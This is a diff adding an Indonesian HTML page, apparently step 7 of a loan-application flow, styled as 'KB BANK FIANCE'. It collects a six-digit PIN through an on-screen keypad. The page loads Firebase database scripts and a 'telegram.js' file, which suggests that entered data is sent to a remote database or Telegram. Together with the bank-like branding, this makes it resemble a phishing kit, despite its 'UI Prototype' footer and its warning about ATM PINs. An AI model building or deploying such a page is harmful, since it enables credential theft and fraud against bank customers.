@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>KB BANK FIANCE — Konfirmasi PIN</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="flow.css">
+</head>
+<body class="flow-page">
+  <main class="flow-shell">
+    <section class="flow-hero">
+      <div class="flow-top">
+        <button class="flow-back" id="backButton" type="button">←</button>
+        <button class="flow-lang" type="button">ID 🇮🇩</button>
+      </div>
+      <div class="flow-copy">
+        <div class="flow-step">Tahap 7</div>
+        <h1>Konfirmasi PIN</h1>
+        <p>Langkah terakhir sebelum pengajuan diproses.</p>
+      </div>
+    </section>
+    
+<section class="flow-card">
+  <div class="flow-title">
+    <h2>Konfirmasi PIN Aplikasi</h2>
+    <p>Masukkan PIN khusus aplikasi untuk mengonfirmasi pengiriman pengajuan.</p>
+  </div>
+  <div class="flow-note">Jangan gunakan PIN ATM, PIN mobile banking, password rekening, atau kode OTP. PIN tidak disimpan secara mentah di localStorage.</div>
+  <div class="pin-dots" id="pinDots">
+    <span class="pin-dot"></span><span class="pin-dot"></span><span class="pin-dot"></span>
+    <span class="pin-dot"></span><span class="pin-dot"></span><span class="pin-dot"></span>
+  </div>
+  <div class="keypad" id="keypad">
+    <button type="button">1</button><button type="button">2</button><button type="button">3</button>
+    <button type="button">4</button><button type="button">5</button><button type="button">6</button>
+    <button type="button">7</button><button type="button">8</button><button type="button">9</button>
+    <button type="button" data-action="clear">C</button><button type="button">0</button><button type="button" data-action="delete">⌫</button>
+  </div>
+  <button class="flow-button" id="confirmPinButton" type="button" disabled style="margin-top:16px">KONFIRMASI PIN →</button>
+  <div class="flow-message" id="message"></div>
+</section>
+  </main>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="telegram.js"></script>
+  <script src="konfirmasi-pin.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
